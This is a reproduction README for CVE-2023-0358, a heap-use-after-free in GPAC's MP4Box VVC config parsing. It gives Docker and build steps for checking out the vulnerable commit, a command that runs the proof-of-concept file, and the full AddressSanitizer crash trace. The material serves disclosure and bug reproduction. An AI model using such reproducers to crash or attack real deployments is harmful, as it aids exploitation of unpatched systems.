### CVE-2023-0358

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/93e128ed-253f-4c42-81ff-fbac7fd8f355/)

### Docker Container Run Command
```shell
docker build -t cve-2023-0358-poc .
docker run -itd --name CVE-2023-0358-POC cve-2023-0358-poc
docker exec -it CVE-2023-0358-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:gpac/gpac.git

# Rollback to the vulnerable version.
cd gpac/
git reset --hard 7e2cb01002056bde1b66062f83010f0d30a79bdb

# Install the compilation and installation dependencies.
apt install gcc make zlib1g-dev pkg-config clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
./configure --enable-sanitizer --enable-debug
make
make install

# Open the poc file.
MP4Box -hint /poc/POC
```

### Description
Observed that:
```shell
[iso file] Unknown top-level box type freN
[VVC] Invalid NALU type in vvcC - ignoring
=================================================================
==8819==ERROR: AddressSanitizer: heap-use-after-free on address 0xffffa62014f0 at pc 0xffffad5d9114 bp 0xffffe518d710 sp 0xffffe518d720
READ of size 1 at 0xffffa62014f0 thread T0
#0 0xffffad5d9110 in gf_odf_vvc_cfg_read_bs (/usr/local/lib/libgpac.so.12+0x2069110)
#1 0xffffad3887b4 in vvcc_box_read (/usr/local/lib/libgpac.so.12+0x1e187b4)
#2 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#3 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#4 0xffffad3bbe80 in video_sample_entry_box_read (/usr/local/lib/libgpac.so.12+0x1e4be80)
#5 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#6 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#7 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#8 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#9 0xffffad3c24ac in stbl_box_read (/usr/local/lib/libgpac.so.12+0x1e524ac)
#10 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#11 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#12 0xffffad3b4cb4 in minf_box_read (/usr/local/lib/libgpac.so.12+0x1e44cb4)
#13 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#14 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#15 0xffffad3b1a1c in mdia_box_read (/usr/local/lib/libgpac.so.12+0x1e41a1c)
#16 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#17 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#18 0xffffad3cf7f8 in trak_box_read (/usr/local/lib/libgpac.so.12+0x1e5f7f8)
#19 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#20 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#21 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#22 0xffffad44fe9c in gf_isom_parse_root_box (/usr/local/lib/libgpac.so.12+0x1edfe9c)
#23 0xffffad474374 in gf_isom_parse_movie_boxes_internal (/usr/local/lib/libgpac.so.12+0x1f04374)
#24 0xffffad479210 in gf_isom_open_file (/usr/local/lib/libgpac.so.12+0x1f09210)
#25 0xaaaac1ff2c54 in mp4box_main /poc/gpac/applications/mp4box/mp4box.c:6221
#26 0xffffaad573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#27 0xffffaad574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#28 0xaaaac1fce4ec in _start (/usr/local/bin/MP4Box+0xa64ec)

0xffffa62014f0 is located 0 bytes inside of 16-byte region [0xffffa62014f0,0xffffa6201500)
freed by thread T0 here:
#0 0xffffb0699fe8 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:127
#1 0xffffad5d8a3c in gf_odf_vvc_cfg_read_bs (/usr/local/lib/libgpac.so.12+0x2068a3c)
#2 0xffffad3887b4 in vvcc_box_read (/usr/local/lib/libgpac.so.12+0x1e187b4)
#3 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#4 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#5 0xffffad3bbe80 in video_sample_entry_box_read (/usr/local/lib/libgpac.so.12+0x1e4be80)
#6 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#7 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#8 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#9 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#10 0xffffad3c24ac in stbl_box_read (/usr/local/lib/libgpac.so.12+0x1e524ac)
#11 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#12 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#13 0xffffad3b4cb4 in minf_box_read (/usr/local/lib/libgpac.so.12+0x1e44cb4)
#14 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#15 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#16 0xffffad3b1a1c in mdia_box_read (/usr/local/lib/libgpac.so.12+0x1e41a1c)
#17 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#18 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#19 0xffffad3cf7f8 in trak_box_read (/usr/local/lib/libgpac.so.12+0x1e5f7f8)
#20 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#21 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#22 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#23 0xffffad44fe9c in gf_isom_parse_root_box (/usr/local/lib/libgpac.so.12+0x1edfe9c)
#24 0xffffad474374 in gf_isom_parse_movie_boxes_internal (/usr/local/lib/libgpac.so.12+0x1f04374)
#25 0xffffad479210 in gf_isom_open_file (/usr/local/lib/libgpac.so.12+0x1f09210)
#26 0xaaaac1ff2c54 in mp4box_main /poc/gpac/applications/mp4box/mp4box.c:6221
#27 0xffffaad573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#28 0xffffaad574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#29 0xaaaac1fce4ec in _start (/usr/local/bin/MP4Box+0xa64ec)

previously allocated by thread T0 here:
#0 0xffffb069a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffad5d8988 in gf_odf_vvc_cfg_read_bs (/usr/local/lib/libgpac.so.12+0x2068988)
#2 0xffffad3887b4 in vvcc_box_read (/usr/local/lib/libgpac.so.12+0x1e187b4)
#3 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#4 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#5 0xffffad3bbe80 in video_sample_entry_box_read (/usr/local/lib/libgpac.so.12+0x1e4be80)
#6 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#7 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#8 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#9 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#10 0xffffad3c24ac in stbl_box_read (/usr/local/lib/libgpac.so.12+0x1e524ac)
#11 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#12 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#13 0xffffad3b4cb4 in minf_box_read (/usr/local/lib/libgpac.so.12+0x1e44cb4)
#14 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#15 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#16 0xffffad3b1a1c in mdia_box_read (/usr/local/lib/libgpac.so.12+0x1e41a1c)
#17 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#18 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#19 0xffffad3cf7f8 in trak_box_read (/usr/local/lib/libgpac.so.12+0x1e5f7f8)
#20 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#21 0xffffad4533b8 in gf_isom_box_array_read (/usr/local/lib/libgpac.so.12+0x1ee33b8)
#22 0xffffad44e9e0 in gf_isom_box_parse_ex (/usr/local/lib/libgpac.so.12+0x1ede9e0)
#23 0xffffad44fe9c in gf_isom_parse_root_box (/usr/local/lib/libgpac.so.12+0x1edfe9c)
#24 0xffffad474374 in gf_isom_parse_movie_boxes_internal (/usr/local/lib/libgpac.so.12+0x1f04374)
#25 0xffffad479210 in gf_isom_open_file (/usr/local/lib/libgpac.so.12+0x1f09210)
#26 0xaaaac1ff2c54 in mp4box_main /poc/gpac/applications/mp4box/mp4box.c:6221
#27 0xffffaad573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#28 0xffffaad574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#29 0xaaaac1fce4ec in _start (/usr/local/bin/MP4Box+0xa64ec)

SUMMARY: AddressSanitizer: heap-use-after-free (/usr/local/lib/libgpac.so.12+0x2069110) in gf_odf_vvc_cfg_read_bs
Shadow bytes around the buggy address:
0x200ff4c40240: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4c40250: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4c40260: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4c40270: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4c40280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x200ff4c40290: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fd]fd
0x200ff4c402a0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
0x200ff4c402b0: fa fa 00 00 fa fa 00 00 fa fa 01 fa fa fa 00 00
0x200ff4c402c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
0x200ff4c402d0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
0x200ff4c402e0: fa fa 00 00 fa fa fd fd fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==8819==ABORTING
```



